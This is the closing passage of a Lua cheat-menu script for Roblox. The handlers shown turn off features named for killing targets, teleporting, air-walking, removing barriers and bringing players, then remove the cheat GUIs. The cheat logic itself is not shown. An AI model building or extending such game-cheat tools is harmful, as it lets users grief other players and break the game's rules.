	UNRBW.MouseButton1Down:connect(function()
		_G.RemoveBarriers = false
	end)
	UNRBW.MouseButton1Down:connect(function()
		RBW.Visible = true
		UNRBW.Visible = false
	end)
	
	--UNRP
	UNRP.MouseButton1Down:connect(function()
		_G.RemovePrompts = false
	end)
	UNRP.MouseButton1Down:connect(function()
		RP.Visible = true
		UNRP.Visible = false
	end)
	
	--UNVB
	UNVB.MouseButton1Down:connect(function()
		_G.Visible = false
		for  i=66,0 do
		    wait()
		    for i,v in pairs(workspace:GetDescendants()) do
		    	if v.Name == "FF" then
		    		v.Transparency = 1
		    		v.Color = BrickColor.new("Institutional white").Color
		    	end
		    end
		end
	end)
	UNVB.MouseButton1Down:connect(function()
		VB.Visible = true
		UNVB.Visible = false
	end)
	
	--X
	X.MouseButton1Down:connect(function()
	    _G.Cbring = false
        _G.Activate = false
        _G.OpenBlocks = false
        _G.RocketTarget = false
        _G.KillTarget = false
        _G.AirWalk = false
        _G.ClickTp = false
        _G.KillHits = false
        _G.AntiCrash = false
        _G.RemoveMe = false


        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	        if v:IsA("Part") and v.Anchored == true then
		        v.Anchored = false
	        end
        end
	    for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
		    if v.Name == "LBBGui" or v.Name == "Kill Gui" then
		        v:Remove()
		    end
		end
	end)
end
coroutine.wrap(NJTXEZI_fake_script)()
end
for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
	if v.Name == "ChGui2" then
		v:Remove()
	end
end
TheGui()
